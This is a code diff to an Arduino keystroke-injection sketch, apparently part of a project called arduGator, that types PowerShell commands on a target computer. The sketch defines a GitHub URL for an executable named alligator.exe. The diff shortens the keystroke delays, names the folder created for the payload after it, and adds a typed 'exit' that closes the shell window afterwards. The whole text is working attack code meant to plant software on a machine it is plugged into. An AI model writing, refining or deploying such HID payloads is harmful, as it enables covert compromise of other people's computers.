@@ -1,6 +1,6 @@
 #include <Keyboard.h>
 
-#define DELAY_MULT 30
+#define DELAY_MULT 10
 #define URL "https://github.com/germanquero/arduGator/raw/refs/heads/main/alligator/exe_dwnld/alligator.exe"
 #define NAME "Alligator"
 
@@ -106,7 +106,7 @@ void setup() {
   delay(DELAY_MULT);
   Keyboard.release(KEY_RETURN);
   delay(DELAY_MULT);
-  printString("New-Item \".\\alligator\" -ItemType \"directory\"");
+  printString("New-Item \".\\" + String(NAME) + "\" -ItemType \"directory\"");
   Keyboard.press(KEY_RETURN);
   delay(DELAY_MULT);
   Keyboard.release(KEY_RETURN);
@@ -121,7 +121,11 @@ void setup() {
   delay(DELAY_MULT);
   Keyboard.release(KEY_RETURN);
   delay(DELAY_MULT);
-  
+  printString("exit");
+  Keyboard.press(KEY_RETURN);
+  delay(DELAY_MULT);
+  Keyboard.release(KEY_RETURN);
+  delay(DELAY_MULT);
 
 }
 
